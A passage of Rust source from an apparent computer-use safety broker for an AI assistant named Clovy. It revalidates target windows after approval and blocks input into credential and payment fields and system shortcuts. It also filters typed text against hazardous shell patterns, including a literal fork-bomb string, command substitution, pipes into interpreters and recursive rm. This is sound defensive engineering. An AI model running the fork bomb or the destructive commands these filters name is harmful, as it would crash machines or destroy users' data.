            task_generation,
        )
        .await
        .map(|mut capture| {
            add_result_metadata(&mut capture, &action_id, &target.app_name);
            capture
        });
        return Ok(combine_action_and_capture(result, capture_result));
    }
    Ok(result)
}

// A transport or helper failure does not establish whether input reached the
// target. Preserve any stronger evidence, otherwise require an observation
// before the caller considers another mutation.
fn action_delivery_unknown(mut error: AppError, action_id: &str) -> AppError {
    let mut details = error.details.take().unwrap_or_else(|| json!({}));
    if !details.is_object() {
        details = json!({ "cause": details });
    }
    if !details.get("disposition").is_some_and(Value::is_object) {
        details["disposition"] = json!({ "delivery": "unknown", "retry": "unsafe" });
    } else if details["disposition"]["delivery"].as_str() != Some("not_delivered") {
        // Unknown retry metadata is not stronger evidence than an uncertain
        // dispatch. Preserve the native receipt, but never advertise replay.
        if !details["disposition"]["delivery"].is_string() {
            details["disposition"]["delivery"] = json!("unknown");
        }
        details["disposition"]["retry"] = json!("unsafe");
    }
    details["actionId"] = json!(action_id);
    error.details = Some(details);
    error
}

fn action_delivered_unverified(mut error: AppError, action_id: &str) -> AppError {
    let mut details = error.details.take().unwrap_or_else(|| json!({}));
    if !details.is_object() {
        details = json!({ "cause": details });
    }
    if let Some(prior) = details.get("disposition").cloned() {
        details["subsequentDisposition"] = prior;
    }
    if let Some(prior) = details.get("actionId").cloned() {
        details["subsequentActionId"] = prior;
    }
    details["disposition"] = json!({ "delivery": "delivered_unverified", "retry": "unsafe" });
    details["actionId"] = json!(action_id);
    error.details = Some(details);
    error
}

// Once the driver has returned an action result, a later capture cannot
// determine whether it is safe to repeat that action. Keep its receipt even
// when the follow-up observation fails.
pub(crate) fn combine_action_and_capture(
    mut action: Value,
    capture: Result<Value, AppError>,
) -> Value {
    match capture {
        Ok(mut capture) => {
            let key = if capture.get("structuredContent").is_some() {
                "structuredContent"
            } else {
                "structured_content"
            };
            capture[key]["action_receipt"] = action;
            capture
        }
        Err(error) => {
            let warning = json!({
                "capture_after_error": error,
                "message": "The action returned a result, but the follow-up capture failed. Do not repeat the action; inspect the target first."
            });
            if !action.get("content").is_some_and(Value::is_array) {
                action["content"] = json!([]);
            }
            if let Some(parts) = action.get_mut("content").and_then(Value::as_array_mut) {
                parts.push(json!({ "type": "text", "text": warning.to_string() }));
            }
            action["captureAfterError"] = warning;
            action
        }
    }
}

async fn recheck_after_approval(
    app: &AppHandle,
    state: &ComputerUseState,
    epoch: u64,
    task_generation: u64,
) -> Result<(), AppError> {
    ensure_epoch_current(state, Some(epoch))?;
    ensure_attended_run(state)?;
    ensure_task_generation_current(state, task_generation)?;
    ensure_action_eligible(app).await
}

async fn revalidate_target(
    app: &AppHandle,
    state: &ComputerUseState,
    action: &str,
    arguments: &Value,
    approved: &TargetContext,
    epoch: u64,
) -> Result<(), AppError> {
    let stored = state
        .target
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Target lock failed."))?
        .clone()
        .ok_or_else(stale_target_error)?;
    if !same_target_capture(&stored, approved) {
        return Err(stale_target_error());
    }

    let live_window = windows(app, state, Some(epoch))
        .await?
        .into_iter()
        .find(|window| {
            window.pid == approved.pid
                && window.window_id == approved.window_id
                && window.app_name == approved.app_name
                && window.identity == approved.identity
                && window.native_owner == approved.native_owner
                && !blocked_target(state, &window.app_name, &window.identity)
        });
    let live_window = live_window.ok_or_else(stale_target_error)?;

    // Approval can sit for minutes while the user changes the target app.
    // Re-capture privately at the broker immediately before execution. For
    // element-indexed actions, the exact referenced AX role and label must
    // still occupy the same index. Coordinate/key actions have no semantic
    // anchor, so the full screenshot must still match the approved capture.
    let live = driver_call(
        app,
        state,
        "get_window_state",
        json!({
            "pid": approved.pid,
            "window_id": approved.window_id,
            "capture_mode": "som",
            "revalidate": true,
        }),
        Some(epoch),
    )
    .await?;
    let references = referenced_elements(action, arguments);
    if references.is_empty() {
        let approved_hash = approved
            .capture_sha256
            .as_deref()
            .ok_or_else(stale_target_error)?;
        if capture_sha256(&live)?.as_deref() != Some(approved_hash) {
            return Err(stale_target_error());
        }
    } else {
        let tree = structured(&live)
            .and_then(|value| value.get("tree_markdown"))
            .and_then(Value::as_str)
            .unwrap_or("");
        validate_element_references(approved, &parse_elements(tree, MAX_ELEMENTS), &references)?;
    }
    let mut current = state
        .target
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Target lock failed."))?;
    if !current
        .as_ref()
        .is_some_and(|current| same_target_capture(current, approved))
    {
        return Err(stale_target_error());
    }
    if let Some(current) = current.as_mut() {
        current.bounds = crate::computer_use_cursor::ScreenRect {
            x: live_window.x,
            y: live_window.y,
            width: live_window.width,
            height: live_window.height,
        };
    }
    Ok(())
}

fn same_target_capture(current: &TargetContext, approved: &TargetContext) -> bool {
    current.capture_generation == approved.capture_generation
        && current.pid == approved.pid
        && current.window_id == approved.window_id
        && current.app_name == approved.app_name
        && current.identity == approved.identity
        && current.native_owner == approved.native_owner
}

fn referenced_elements(action: &str, arguments: &Value) -> Vec<u32> {
    let mut references = Vec::new();
    let mut push = |key: &str| {
        if let Some(index) = arguments
            .get(key)
            .and_then(Value::as_u64)
            .and_then(|value| u32::try_from(value).ok())
        {
            references.push(index);
        }
    };
    match action {
        "click" | "double_click" | "right_click" | "scroll" | "type" | "key" | "set_value" => {
            push("element")
        }
        _ => {}
    }
    references.sort_unstable();
    references.dedup();
    references
}

fn validate_element_references(
    approved: &TargetContext,
    live: &HashMap<u32, ElementSummary>,
    references: &[u32],
) -> Result<(), AppError> {
    for index in references {
        let Some(expected) = approved.elements.get(index) else {
            return Err(stale_element_error());
        };
        if live.get(index) != Some(expected) {
            return Err(stale_element_error());
        }
    }
    Ok(())
}

fn stale_target_error() -> AppError {
    AppError::new(
        "computer_use_target_stale",
        "The target app changed while approval was pending. Capture it again before acting.",
    )
}

fn stale_element_error() -> AppError {
    AppError::new(
        "computer_use_element_stale",
        "The target control changed while approval was pending. Capture it again before acting.",
    )
}

async fn park_app_authorization(
    app: &AppHandle,
    state: &ComputerUseState,
    target_app: &str,
) -> Result<(), AppError> {
    let approval_id = random_id();
    let action_id = random_id();
    let now = now_ms();
    let approval = PendingComputerUseApproval {
        approval_id: approval_id.clone(),
        action_id,
        action: "use_app".to_string(),
        target_app: sanitize_line(target_app),
        summary: "Clovy can inspect and operate this app until the current task ends.".to_string(),
        capture_path: None,
        requested_at_ms: now,
        expires_at_ms: now.saturating_add(APPROVAL_TIMEOUT.as_millis() as u64),
    };
    let (sender, receiver) = oneshot::channel();
    state
        .approvals
        .lock()
        .map_err(|_| AppError::new("computer_use_unavailable", "Approval lock failed."))?
        .insert(
            approval_id.clone(),
            PendingEntry {
                approval,
                responder: sender,
            },
        );
    emit_approvals_changed(app, state);
    let approved = match tokio::time::timeout(APPROVAL_TIMEOUT, receiver).await {
        Ok(Ok(approved)) => approved,
        Ok(Err(_)) => false,
        Err(_) => false,
    };
    if let Ok(mut approvals) = state.approvals.lock() {
        approvals.remove(&approval_id);
    }
    emit_approvals_changed(app, state);
    if approved {
        Ok(())
    } else {
        Err(AppError::new(
            "computer_use_app_denied",
            "Computer use access to this app was denied, cancelled, or timed out.",
        ))
    }
}

fn validate_sensitive_action(
    state: &ComputerUseState,
    action: &str,
    arguments: &Value,
    target: &TargetContext,
) -> Result<(), AppError> {
    if blocked_target(state, &target.app_name, &target.identity) {
        return Err(AppError::new(
            "computer_use_target_blocked",
            format!(
                "Clovy cannot operate {} with Computer use.",
                target.app_name
            ),
        ));
    }
    let references = referenced_elements(action, arguments);
    validate_element_references(target, &target.elements, &references)?;
    if action == "type" {
        let text = arguments.get("text").and_then(Value::as_str).unwrap_or("");
        if text.is_empty() {
            return Err(AppError::new(
                "computer_use_text_required",
                "The type action requires text.",
            ));
        }
        if text.chars().count() > 10_000 {
            return Err(AppError::new(
                "computer_use_text_too_long",
                "Computer use cannot type more than 10,000 characters at once.",
            ));
        }
        let element = element_arg(arguments, "element")?;
        ensure_element_accepts_text(target, element)?;
        ensure_element_not_sensitive(target, element)?;
        ensure_text_not_hazardous(text)?;
    }
    if action == "set_value" {
        let element = element_arg(arguments, "element")?;
        ensure_element_not_sensitive(target, element)?;
        let value = arguments
            .get("value")
            .and_then(Value::as_str)
            .ok_or_else(|| {
                AppError::new(
                    "computer_use_value_required",
                    "set_value requires a text value.",
                )
            })?;
        if value.chars().count() > 10_000 {
            return Err(AppError::new(
                "computer_use_value_too_long",
                "Computer use cannot change a value to more than 10,000 characters at once.",
            ));
        }
        ensure_text_not_hazardous(value)?;
    }
    if action == "key" {
        let keys = arguments.get("keys").and_then(Value::as_str).unwrap_or("");
        if blocked_key_combo(keys) {
            return Err(AppError::new(
                "computer_use_key_blocked",
                "Computer use blocked a destructive, credential, clipboard, or system key command.",
            ));
        }
        let (key, modifiers) = parse_key_combo(keys)?;
        if modifiers.is_empty() {
            if let Some(element) = arguments
                .get("element")
                .map(|_| element_arg(arguments, "element"))
                .transpose()?
            {
                if key_can_enter_text(&key) {
                    ensure_element_accepts_text(target, element)?;
                }
                ensure_element_not_sensitive(target, element)?;
            } else if key != "escape" {
                return Err(AppError::new(
                    "computer_use_element_required",
                    "An unmodified key needs a numbered target, except Escape which targets the exact window.",
                ));
            }
        } else if arguments.get("element").is_some() {
            return Err(AppError::new(
                "computer_use_element_invalid",
                "A shortcut cannot target a numbered element. Use a single key for element-scoped input.",
            ));
        } else if key_can_enter_text(&key)
            && !modifiers
                .iter()
                .any(|value| matches!(value.as_str(), "cmd" | "ctrl"))
        {
            return Err(AppError::new(
                "computer_use_key_blocked",
                "Computer use cannot use an unscoped shortcut to enter text. Capture the field and target it directly.",
            ));
        }
    }
    if action == "scroll" && !arguments.get("element").is_some_and(Value::is_u64) {
        return Err(AppError::new(
            "computer_use_element_required",
            "Scroll requires a numbered target so the background app never receives an unfocused command.",
        ));
    }
    Ok(())
}

fn driver_action(
    action: &str,
    arguments: &Value,
    target: &TargetContext,
) -> Result<(&'static str, Value), AppError> {
    let mut args = json!({ "pid": target.pid });
    let object = args.as_object_mut().expect("json object");
    match action {
        "click" | "double_click" | "right_click" => {
            let button = optional_string(arguments, "button")?;
            match (action, button) {
                ("click", Some("left" | "right") | None)
                | ("double_click", Some("left") | None)
                | ("right_click", Some("right") | None) => {}
                _ => {
                    return Err(AppError::new(
                        "computer_use_button_invalid",
                        "The requested mouse button does not match this Computer use action.",
                    ));
                }
            }
            let modifiers = validated_modifiers(arguments)?;
            let mut tool = match action {
                "double_click" => "double_click",
                "right_click" => "right_click",
                _ => match button {
                    Some("right") => "right_click",
                    _ => "click",
                },
            };
            let element = arguments
                .get("element")
                .map(|_| element_arg(arguments, "element"))
                .transpose()?;
            if let Some(element) = element {
                if !modifiers.is_empty() {
                    return Err(AppError::new(
                        "computer_use_modifier_invalid",
                        "Modifier clicks require a screenshot coordinate, not a numbered element.",
                    ));
                }
                object.insert("window_id".to_string(), json!(target.window_id));
                object.insert("element_index".to_string(), json!(element));
            } else {
                let (x, y) = coordinate(arguments, "coordinate")?;
                object.insert("window_id".to_string(), json!(target.window_id));
                object.insert("x".to_string(), json!(x));
                object.insert("y".to_string(), json!(y));
                // Keep double-click coordinates in the screenshot-local
                // contract. The adapter performs the physical conversion once.
                if action == "double_click" {
                    object.insert("count".to_string(), json!(2));
                    tool = "click";
                }
            }
            if !modifiers.is_empty() {
                object.insert("modifier".to_string(), json!(modifiers));
            }
            // Keep the borrow checker from inferring a request-lifetime string.
            tool = match tool {
                "double_click" => "double_click",
                "right_click" => "right_click",
                _ => "click",
            };
            Ok((tool, args))
        }
        "drag" => {
            let (from_x, from_y) = coordinate(arguments, "from_coordinate")?;
            let (to_x, to_y) = coordinate(arguments, "to_coordinate")?;
            object.insert("window_id".to_string(), json!(target.window_id));
            object.insert("from_x".to_string(), json!(from_x));
            object.insert("from_y".to_string(), json!(from_y));
            object.insert("to_x".to_string(), json!(to_x));
            object.insert("to_y".to_string(), json!(to_y));
            let modifiers = validated_modifiers(arguments)?;
            if !modifiers.is_empty() {
                object.insert("modifier".to_string(), json!(modifiers));
            }
            Ok(("drag", args))
        }
        "scroll" => {
            let direction = optional_string(arguments, "direction")?.unwrap_or("down");
            if !matches!(direction, "up" | "down" | "left" | "right") {
                return Err(AppError::new(
                    "computer_use_direction_invalid",
                    "Scroll direction must be up, down, left, or right.",
                ));
            }
            let amount = match arguments.get("amount") {
                None => 3,
                Some(value) => value
                    .as_i64()
                    .filter(|value| (1..=50).contains(value))
                    .ok_or_else(|| {
                        AppError::new(
                            "computer_use_amount_invalid",
                            "Scroll amount must be an integer from 1 to 50.",
                        )
                    })?,
            };
            object.insert("direction".to_string(), json!(direction));
            object.insert("amount".to_string(), json!(amount));
            if let Some(element) = arguments
                .get("element")
                .map(|_| element_arg(arguments, "element"))
                .transpose()?
            {
                object.insert("window_id".to_string(), json!(target.window_id));
                object.insert("element_index".to_string(), json!(element));
            }
            Ok(("scroll", args))
        }
        "type" => {
            let element = element_arg(arguments, "element")?;
            object.insert("window_id".to_string(), json!(target.window_id));
            object.insert("element_index".to_string(), json!(element));
            object.insert(
                "text".to_string(),
                json!(arguments.get("text").and_then(Value::as_str).unwrap_or("")),
            );
            Ok(("type_text", args))
        }
        "key" => {
            let keys = arguments.get("keys").and_then(Value::as_str).unwrap_or("");
            let (key, modifiers) = parse_key_combo(keys)?;
            if modifiers.is_empty() {
                object.insert("key".to_string(), json!(key));
                object.insert("window_id".to_string(), json!(target.window_id));
                if let Some(element) = arguments.get("element").and_then(Value::as_u64) {
                    object.insert("element_index".to_string(), json!(element));
                }
                Ok(("press_key", args))
            } else {
                if arguments.get("element").is_some() {
                    return Err(AppError::new(
                        "computer_use_element_invalid",
                        "A shortcut cannot target a numbered element. Use a single key for element-scoped input.",
                    ));
                }
                let mut values = modifiers;
                values.push(key);
                // A shortcut is always bound to the captured window, even
                // when the application owns several windows.
                object.insert("window_id".to_string(), json!(target.window_id));
                object.insert("keys".to_string(), json!(values));
                Ok(("hotkey", args))
            }
        }
        "set_value" => {
            let element = element_arg(arguments, "element")?;
            object.insert("window_id".to_string(), json!(target.window_id));
            object.insert("element_index".to_string(), json!(element));
            object.insert(
                "value".to_string(),
                arguments.get("value").cloned().ok_or_else(|| {
                    AppError::new("computer_use_value_required", "set_value requires a value.")
                })?,
            );
            Ok(("set_value", args))
        }
        _ => Err(AppError::new(
            "computer_use_action_invalid",
            "Unsupported Computer use action.",
        )),
    }
}

fn structured(result: &Value) -> Option<&Value> {
    result
        .get("structuredContent")
        .or_else(|| result.get("structured_content"))
}

fn parse_elements(tree: &str, max_elements: usize) -> HashMap<u32, ElementSummary> {
    let mut elements = HashMap::new();
    for line in tree.lines() {
        let Some((index, close)) = parse_element_index(line) else {
            continue;
        };
        let tail = line[close + 1..].trim();
        let role = tail.split_whitespace().next().unwrap_or("").to_string();
        let label = if let Some(start) = tail.find('"') {
            tail[start + 1..]
                .find('"')
                .map(|end| tail[start + 1..start + 1 + end].to_string())
                .unwrap_or_default()
        } else {
            tail.split("id=").nth(1).unwrap_or("").trim().to_string()
        };
        let metadata = tail.chars().take(1024).collect();
        elements.insert(
            index,
            ElementSummary {
                role,
                label,
                metadata,
            },
        );
        if elements.len() >= max_elements {
            break;
        }
    }
    elements
}

fn cap_tree(tree: &str, max_elements: usize) -> String {
    let mut elements = 0usize;
    let mut lines = Vec::new();
    for line in tree.lines() {
        let is_element = parse_element_index(line).is_some();
        if is_element {
            if elements >= max_elements {
                continue;
            }
            elements += 1;
        }
        if lines.len() < max_elements.saturating_mul(4).max(80) {
            lines.push(line);
        }
    }
    let mut output = lines.join("\n");
    if parse_elements(tree, MAX_ELEMENTS).len() > elements {
        output.push_str(&format!(
            "\n\nCapture limited to {elements} numbered elements."
        ));
    }
    output
}

fn parse_element_index(line: &str) -> Option<(u32, usize)> {
    let open = line.find('[')?;
    let close = open + 1 + line[open + 1..].find(']')?;
    let raw = line[open + 1..close].trim();
    let raw = raw.strip_prefix("element_index ").unwrap_or(raw).trim();
    Some((raw.parse().ok()?, close))
}

fn sanitize_capture_result(
    mut result: Value,
    target_app: &str,
    capture_path: Option<&str>,
    max_elements: usize,
) -> Value {
    if let Some(content) = result.get_mut("content").and_then(Value::as_array_mut) {
        for part in content {
            if part.get("type").and_then(Value::as_str) == Some("text") {
                if let Some(text) = part.get("text").and_then(Value::as_str) {
                    part["text"] = Value::String(cap_tree(text, max_elements));
                }
            }
        }
    }
    let key = if result.get("structuredContent").is_some() {
        "structuredContent"
    } else {
        "structured_content"
    };
    if !result.get(key).is_some_and(Value::is_object) {
        result[key] = json!({});
    }
    if let Some(structured) = result.get_mut(key).and_then(Value::as_object_mut) {
        if let Some(tree) = structured.get("tree_markdown").and_then(Value::as_str) {
            structured.insert(
                "tree_markdown".to_string(),
                Value::String(cap_tree(tree, max_elements)),
            );
        }
        structured.insert("target_app".to_string(), json!(target_app));
        structured.insert(
            "label".to_string(),
            json!(format!("Computer use capture of {target_app}")),
        );
        if let Some(path) = capture_path {
            // The renderer already receives the full app-data path through the
            // trusted approval command. The model needs only an opaque capture
            // identity; never leak the user's home-directory path into its
            // tool context.
            if let Some(name) = Path::new(path).file_name().and_then(OsStr::to_str) {
                structured.insert("capture_reference".to_string(), json!(name));
            }
        }
    }
    result
}

fn capture_bytes(result: &Value) -> Result<Option<Vec<u8>>, AppError> {
    let image = result
        .get("content")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .find(|part| part.get("type").and_then(Value::as_str) == Some("image"));
    let Some(data) = image
        .and_then(|part| part.get("data"))
        .and_then(Value::as_str)
    else {
        return Ok(None);
    };
    let bytes = BASE64.decode(data).map_err(|_| {
        AppError::new(
            "computer_use_capture_invalid",
            "The Computer use driver returned an invalid screenshot.",
        )
    })?;
    if bytes.len() > SCREENSHOT_MAX_BYTES {
        return Err(AppError::new(
            "computer_use_capture_too_large",
            "The Computer use screenshot is too large.",
        ));
    }
    if !bytes.starts_with(b"\x89PNG\r\n\x1a\n") && !bytes.starts_with(b"\xff\xd8") {
        return Err(AppError::new(
            "computer_use_capture_invalid",
            "The Computer use driver returned an unsupported screenshot format.",
        ));
    }
    Ok(Some(bytes))
}

fn capture_sha256(result: &Value) -> Result<Option<String>, AppError> {
    Ok(capture_bytes(result)?.map(|bytes| format!("{:x}", Sha256::digest(bytes))))
}

fn save_capture(app: &AppHandle, result: &Value) -> Result<Option<String>, AppError> {
    let Some(bytes) = capture_bytes(result)? else {
        return Ok(None);
    };
    let extension = if bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
        "png"
    } else {
        "jpg"
    };
    let dir = capture_dir(app)?;
    std::fs::create_dir_all(&dir)
        .map_err(|error| AppError::new("computer_use_capture_failed", error.to_string()))?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700))
            .map_err(|error| AppError::new("computer_use_capture_failed", error.to_string()))?;
    }
    let path = dir.join(format!("{}.{}", random_id(), extension));
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options.mode(0o600);
    }
    options
        .open(&path)
        .and_then(|mut file| file.write_all(&bytes))
        .map_err(|error| AppError::new("computer_use_capture_failed", error.to_string()))?;
    Ok(Some(path.to_string_lossy().into_owned()))
}

fn capture_dir(app: &AppHandle) -> Result<PathBuf, AppError> {
    Ok(crate::app_paths::app_data_dir(app)
        .map_err(|error| AppError::new("computer_use_capture_failed", error.to_string()))?
        .join("agent-workspaces")
        .join("computer-use")
        .join("captures"))
}

fn clear_capture_dir(app: &AppHandle) {
    if let Ok(dir) = capture_dir(app) {
        let _ = std::fs::remove_dir_all(dir);
    }
}

fn remove_capture(path: Option<&str>) {
    if let Some(path) = path {
        let _ = std::fs::remove_file(path);
    }
}

fn blocked_target(state: &ComputerUseState, app_name: &str, identity: &AppIdentity) -> bool {
    let executable = identity
        .executable_path
        .file_name()
        .and_then(OsStr::to_str)
        .unwrap_or("");
    // Check all three independently. A localized/spoofed WindowServer owner
    // name cannot disguise a blocked bundle, while an unsigned/no-bundle
    // process never reaches this function because identity resolution fails.
    blocked_app(app_name)
        || blocked_app(&identity.bundle_id)
        || blocked_app(executable)
        || !matches!(
            state
                .browser_runtime
                .get()
                .map(|runtime| runtime.owns(&identity.executable_path)),
            Some(Ok(false))
        )
}

fn ensure_element_not_sensitive(target: &TargetContext, element: u32) -> Result<(), AppError> {
    let summary = target.elements.get(&element).ok_or_else(|| {
        AppError::new(
            "computer_use_element_stale",
            "That numbered element is not in the latest capture. Capture again.",
        )
    })?;
    let normalized =
        format!("{} {} {}", summary.role, summary.label, summary.metadata).to_ascii_lowercase();
    let sensitive = [
        "password",
        "passcode",
        "one-time",
        "one time",
        "verification code",
        "security code",
        "auth code",
        "otp",
        "credit card",
        "card number",
        "payment",
        "billing",
        "expiration date",
        "expiry date",
        "expiration",
        "expiry",
        "mm/yy",
        "mm / yy",
        "cardholder",
        "bank account",
        "account number",
        "routing number",
        "sort code",
        "iban",
        "swift code",
        "cvv",
        "cvc",
        "social security",
        "tax identification",
        "date of birth",
        "autocomplete=one-time-code",
        "autocomplete=cc-",
        "pin",
        "secret",
        "private key",
        "api key",
        "access token",
        "seed phrase",
        "recovery phrase",
        "terminal",
        "command line",
        "shell prompt",
    ]
    .iter()
    .any(|term| normalized.contains(term));
    let password_role = normalized.contains("securetextfield")
        || normalized.contains("axsecure")
        || normalized.contains("passwordfield");
    if sensitive || password_role {
        return Err(AppError::new(
            "computer_use_sensitive_field_blocked",
            "Computer use cannot enter credentials, one-time codes, payment data, or secrets. Take over to complete this field.",
        ));
    }
    Ok(())
}

fn ensure_element_accepts_text(target: &TargetContext, element: u32) -> Result<(), AppError> {
    let summary = target.elements.get(&element).ok_or_else(|| {
        AppError::new(
            "computer_use_element_stale",
            "That numbered element is not in the latest capture. Capture again.",
        )
    })?;
    let role: String = summary
        .role
        .chars()
        .filter(|ch| ch.is_ascii_alphanumeric())
        .flat_map(char::to_lowercase)
        .collect();
    if [
        "textfield",
        "textarea",
        "searchfield",
        "combobox",
        "editabletext",
    ]
    .iter()
    .any(|editable| role.contains(editable))
    {
        Ok(())
    } else {
        Err(AppError::new(
            "computer_use_text_target_invalid",
            "Computer use can type only into a captured editable text field.",
        ))
    }
}

fn ensure_text_not_hazardous(text: &str) -> Result<(), AppError> {
    if contains_blocked_shell_pattern(text) {
        Err(AppError::new(
            "computer_use_dangerous_text_blocked",
            "Computer use blocked text matching a hazardous shell pattern. Take over to review or enter it.",
        ))
    } else {
        Ok(())
    }
}

fn contains_blocked_shell_pattern(text: &str) -> bool {
    let text = text.to_ascii_lowercase();
    if text.contains("$(") || text.contains(":(){:|:&};:") {
        return true;
    }

    if text.split('|').skip(1).any(piped_stage_starts_interpreter) {
        return true;
    }

    let tokens = text
        .split(|character: char| {
            character.is_ascii_whitespace()
                || matches!(character, '|' | ';' | '&' | '(' | ')' | '<' | '>')
        })
        .filter(|token| !token.is_empty())
        .collect::<Vec<_>>();
    tokens.iter().enumerate().any(|(index, token)| {
        if shell_command_name(token) != "rm" {
            return false;
        }
        let wrapped_dangerously = tokens[..index]
            .iter()
            .any(|token| matches!(shell_command_name(token), "sudo" | "doas" | "xargs"));
        let recursive = tokens[index + 1..]
            .iter()
            .take(8)
            .any(|token| is_recursive_rm_flag(token));
        wrapped_dangerously || recursive
    })
}

fn piped_stage_starts_interpreter(stage: &str) -> bool {
    stage
        .split_ascii_whitespace()
        .map(shell_command_name)
        .find(|command| {
            !command.is_empty()
                && !matches!(*command, "command" | "env" | "nohup" | "sudo" | "doas")
                && !command.contains('=')
        })
        .is_some_and(|command| {
            matches!(
                command,
                "sh" | "bash"
                    | "dash"
                    | "zsh"
                    | "ksh"
                    | "fish"
                    | "perl"
                    | "ruby"
                    | "node"
                    | "osascript"
                    | "pwsh"
                    | "powershell"
            ) || command.starts_with("python")
        })
}

fn shell_command_name(token: &str) -> &str {
    token
        .trim_matches(|character: char| {
            matches!(character, '\'' | '"' | '`' | '[' | ']' | '{' | '}' | ',')
        })
        .rsplit('/')
        .next()
        .unwrap_or("")
}

fn is_recursive_rm_flag(token: &str) -> bool {
    let token = token.trim_matches(|character| matches!(character, '\'' | '"' | '`'));
    token == "--recursive"
        || (token.starts_with('-')
            && !token.starts_with("--")
            && token.as_bytes()[1..].contains(&b'r'))
}

fn blocked_key_combo(keys: &str) -> bool {
    blocked_key_combo_for_platform(keys, cfg!(target_os = "windows"))
}

fn blocked_key_combo_for_platform(keys: &str, windows: bool) -> bool {
    let parts: HashSet<String> = keys
        .split(['+', '-'])
        .map(|part| normalize_key(part.trim()))
        .filter(|part| !part.is_empty())
        .collect();
    let has = |required: &[&str]| required.iter().all(|key| parts.contains(*key));
    let has_any = |keys: &[&str]| keys.iter().any(|key| parts.contains(*key));
    if windows {
        // Windows-key chords address the shell, even with an exact app target.
        // Clipboard and task-switching shortcuts retain the existing boundary.
        return has_any(&["cmd", "meta", "win", "windows", "super", "printscreen"])
            || (parts.contains("ctrl") && has_any(&["c", "v", "x", "escape", "space"]))
            || (parts.contains("option") && has_any(&["f4", "tab", "escape", "space"]))
            || has(&["ctrl", "option", "delete"])
            || has(&["ctrl", "insert"])
            || (parts.contains("shift") && has_any(&["insert", "delete"]));
    }
    has(&["cmd", "q"])
        || has(&["cmd", "shift", "q"])
        || has(&["cmd", "ctrl", "q"])
        || has(&["cmd", "option", "escape"])
        || has(&["cmd", "shift", "backspace"])
        || has(&["cmd", "option", "backspace"])
        || has(&["cmd", "v"])
        || has(&["cmd", "c"])
        || has(&["cmd", "x"])
        // These shortcuts are owned by macOS, not the target app. Even if a
        // engine release changes how it posts background events, Computer use
        // must never open Spotlight/app switching or change Mission Control,
        // keyboard input source, or the active Space.
        || (parts.contains("cmd") && has_any(&["tab", "space"]))
        || (parts.contains("ctrl")
            && has_any(&["left", "right", "up", "down", "space"]))
        || has(&["cmd", "option", "h"])
        || has(&["cmd", "option", "m"])
        || (has(&["cmd", "shift"]) && has_any(&["3", "4", "5"]))
}

fn parse_key_combo(keys: &str) -> Result<(String, Vec<String>), AppError> {
    if keys.len() > 64 {
        return Err(AppError::new(
            "computer_use_key_invalid",
            "The key action is too long.",
        ));
    }
    let mut key = None;
    let mut modifiers = Vec::new();
    let mut seen_modifiers = HashSet::new();
    for part in keys.split(['+', '-']) {
        let part = normalize_key(part.trim());
        if part.is_empty() {
            continue;
        }
        if matches!(part.as_str(), "cmd" | "shift" | "option" | "ctrl" | "fn") {
            if !seen_modifiers.insert(part.clone()) {
                return Err(AppError::new(
                    "computer_use_key_invalid",
                    "The key action contains a duplicate modifier.",
                ));
            }
            modifiers.push(part);
        } else {
            if key.is_some() || !supported_non_modifier_key(&part) {
                return Err(AppError::new(
                    "computer_use_key_invalid",
                    "The key action needs exactly one supported non-modifier key.",
                ));
            }
            key = Some(part);
        }
    }
    key.map(|key| (key, modifiers)).ok_or_else(|| {
        AppError::new(
            "computer_use_key_invalid",
            "The key action needs one non-modifier key.",
        )
    })
}

fn supported_non_modifier_key(key: &str) -> bool {
    (key.len() == 1 && key.as_bytes()[0].is_ascii_alphanumeric())
        || matches!(
            key,
            "return"
                | "tab"
                | "escape"
                | "up"
                | "down"
                | "left"
                | "right"
                | "space"
                | "delete"
                | "backspace"
                | "home"
                | "end"
                | "pageup"
                | "pagedown"
                | "f1"
                | "f2"
                | "f3"
                | "f4"
                | "f5"
                | "f6"
                | "f7"
                | "f8"
                | "f9"
                | "f10"
                | "f11"
                | "f12"
        )
}

fn key_can_enter_text(key: &str) -> bool {
    (key.len() == 1 && key.as_bytes()[0].is_ascii_alphanumeric()) || key == "space"
}

fn optional_string<'a>(arguments: &'a Value, key: &str) -> Result<Option<&'a str>, AppError> {
    match arguments.get(key) {
        None => Ok(None),
        Some(value) => value.as_str().map(Some).ok_or_else(|| {
            AppError::new(
                "computer_use_argument_invalid",
                format!("Computer use requires {key} to be text."),
            )
        }),
    }
}

fn validated_modifiers(arguments: &Value) -> Result<Vec<String>, AppError> {
    validated_modifiers_for_platform(arguments, cfg!(target_os = "windows"))
}

fn validated_modifiers_for_platform(
    arguments: &Value,
    windows: bool,
) -> Result<Vec<String>, AppError> {
    let Some(value) = arguments.get("modifiers") else {
        return Ok(Vec::new());
    };
    let values = value.as_array().ok_or_else(|| {
        AppError::new(
            "computer_use_modifier_invalid",
            "Computer use modifiers must be a list.",
        )
    })?;
    let mut normalized = Vec::with_capacity(values.len());
    let mut seen = HashSet::new();
    for value in values {
        let modifier = value.as_str().map(normalize_key).ok_or_else(|| {
            AppError::new(
                "computer_use_modifier_invalid",
                "Computer use modifiers must be text.",
            )
        })?;
        if !matches!(
            modifier.as_str(),
            "cmd" | "shift" | "option" | "ctrl" | "fn"
        ) || !seen.insert(modifier.clone())
        {
            return Err(AppError::new(
                "computer_use_modifier_invalid",
                "Computer use received an unsupported or duplicate modifier.",
            ));
        }
        if windows && modifier == "cmd" {
            return Err(AppError::new(
                "computer_use_key_blocked",
                "Computer use cannot hold the Windows key while operating an app.",
            ));
        }
        normalized.push(modifier);
    }
    Ok(normalized)
}

fn normalize_key(key: &str) -> String {
    match key.to_ascii_lowercase().as_str() {
        "command" | "⌘" => "cmd".to_string(),
        "control" => "ctrl".to_string(),
        "alt" | "⌥" => "option".to_string(),
        "esc" => "escape".to_string(),
        "enter" => "return".to_string(),
        "del" => "delete".to_string(),
        "pgup" | "page_up" => "pageup".to_string(),
        "pgdn" | "page_down" => "pagedown".to_string(),
        other => other.to_string(),
    }
}

fn coordinate(arguments: &Value, key: &str) -> Result<(i64, i64), AppError> {
    let values = arguments
        .get(key)
        .and_then(Value::as_array)
        .filter(|values| values.len() == 2)
